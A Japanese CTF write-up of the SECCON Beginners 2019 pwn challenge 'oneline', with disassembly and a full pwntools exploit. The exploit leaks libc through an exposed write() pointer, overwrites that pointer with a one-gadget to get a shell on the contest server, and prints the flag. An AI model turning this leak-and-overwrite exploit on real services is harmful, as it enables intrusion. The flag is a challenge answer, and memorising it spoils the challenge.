# はじめに
2019年5月25日〜26日、Szarnyさんと一緒SECCONのCTF For Beginners (ctf4b)に参加し、最後に二人のチームが2707ポイントを集め、666参加チームの中26位で終わりました。

以下、解けた問題「oneline」の解法を紹介していきます。
# oneline

ELFバイナリと`libc-2.27.so`が丁寧に渡されます。

```
$ checksec oneline
[*] '/ctf/SECCON2019-ctf4b/take2/Pwnable/OneLine/oneline'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
$
```
PIEが有効になってるのは面倒臭そう、、だと思ったら、実行すると謎の文字化けが
```
$ ./oneline 
You can input text here!
>> neko
neko
@q:e�Once more again!
>> chan
chan
$
```
逆アセンブリを参考すれば文字化けの原因が明確となります。
```
...
|           0x00000888      488b45f8       mov rax, qword [buf]
|           0x0000088c      488b15450720.  mov rdx, qword [reloc.write]
|           0x00000893      48895020       mov qword [rax + 0x20], rdx
...
|           0x000008be      488b45f8       mov rax, qword [buf]
|           0x000008c2      488b4020       mov rax, qword [rax + 0x20]
|           0x000008c6      488b4df8       mov rcx, qword [buf]
|           0x000008ca      ba28000000     mov edx, 0x28
|           0x000008cf      4889ce         mov rsi, rcx
|           0x000008d2      bf01000000     mov edi, 1
|           0x000008d7      ffd0           call rax
...
```
一回メッセージを出力したところに、バッファーの直後に置いてあるwrite関数のアドレスがリークされてしまうようです。

リークを一度させ、libcのアドレスを計算してポインタをone-gadgetに書き換えれば良さそうです。
```python
#!/usr/bin/env python2
from pwn import *

e = ELF("./oneline")
libc = ELF("./libc-2.27.so")
addr_onegadget = 0x10a38c

SERVER = True 
if SERVER:
	p = remote("153.120.129.186", 10000)
else:
	p = e.process(env={"LD_PRELOAD" : libc.path})

padding = ("NekochanNano!" + " "*0x20)[:0x1f]

p.sendlineafter("> ", padding)
p.readuntil("\n")

addr_write = u64(p.read(8))
addr_libc = addr_write - libc.symbols["write"]
addr_onegadget += addr_libc
print "[*] Address of libc = %s" % hex(addr_libc)
print "[*] Address of onegadget = %s" % hex(addr_onegadget)

p.sendlineafter("> ", padding + "\n" + p64(addr_onegadget))
p.interactive()

p.close()
```
```
$ ./exploit.py 
[*] '/ctf/SECCON2019-ctf4b/take2/Pwnable/OneLine/oneline'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/ctf/SECCON2019-ctf4b/take2/Pwnable/OneLine/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 153.120.129.186 on port 10000: Done
[*] Address of libc = 0x7f5f11d2e000
[*] Address of onegadget = 0x7f5f11e3838c
[*] Switching to interactive mode
$ id
uid=30749 gid=30000(oneline) groups=30000(oneline)
$ cat flag.txt
ctf4b{0v3rwr!t3_Func7!on_p0int3r}
$  
```
`ctf4b{0v3rwr!t3_Func7!on_p0int3r}`というフラグが得られます。

以上 oneline の解法でした。読んで頂き、ありがとうございました！